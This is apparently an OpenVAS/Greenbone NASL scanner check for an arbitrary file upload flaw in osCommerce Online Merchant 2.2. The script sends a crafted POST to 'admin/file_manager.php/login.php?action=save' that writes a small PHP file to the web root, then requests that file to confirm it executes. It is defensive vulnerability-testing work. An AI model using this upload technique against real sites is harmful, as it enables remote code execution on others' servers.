# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:oscommerce:oscommerce";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100661");
  script_version("2021-07-20T10:07:38+0000");
  script_tag(name:"last_modification", value:"2021-07-20 10:07:38 +0000 (Tue, 20 Jul 2021)");
  script_tag(name:"creation_date", value:"2010-06-01 17:39:02 +0200 (Tue, 01 Jun 2010)");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Workaround");

  script_name("osCommerce Online Merchant 'file_manager.php' Remote Arbitrary File Upload Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_oscommerce_http_detect.nasl");
  script_mandatory_keys("oscommerce/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"solution", value:"Delete the file 'file_manager.php' in your 'admin' directory.");

  script_tag(name:"summary", value:"Online Merchant module for osCommerce is prone to a remote
  arbitrary-file-upload vulnerability because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to upload arbitrary code and run
  it in the context of the webserver process. This may facilitate unauthorized access or privilege
  escalation. Other attacks are also possible.");

  script_tag(name:"affected", value:"Online Merchant 2.2 is vulnerable. Other versions may also be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40456");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

vt_strings = get_vt_strings();

file = vt_strings["default_rand"] + ".php";

exp = "filename=" + file + "&file_contents=%3C%3F+echo+%22" + vt_strings["default"] +
      "%22%3B%3F%3E&submit=+++Save+++";

req = string(
        "POST ", dir, "/admin/file_manager.php/login.php?action=save HTTP/1.1\r\n",
        "Content-Type: application/x-www-form-urlencoded\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Length: ", strlen( exp ), "\r\n",
        "Connection: close\r\n\r\n",
         exp );

recv = http_keepalive_send_recv( data:req, port:port, bodyonly:TRUE );

req2 = http_get (item: dir + "/" + file, port:port );
recv2 = http_keepalive_send_recv( data:req2, port:port, bodyonly:TRUE );

if( recv2 == NULL)
  exit(0);

if( vt_strings["default"] >< recv2 ) {
  report = string(
        "Note :\n\n",
        "It was possible to upload and execute a file on the remote webserver.\n",
        "The file is placed in directory: ", '"', dir, '"', "\n",
        "and is named: ", '"', file, '"', "\n\n",
        "You should delete this file as soon as possible!\n" );

  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
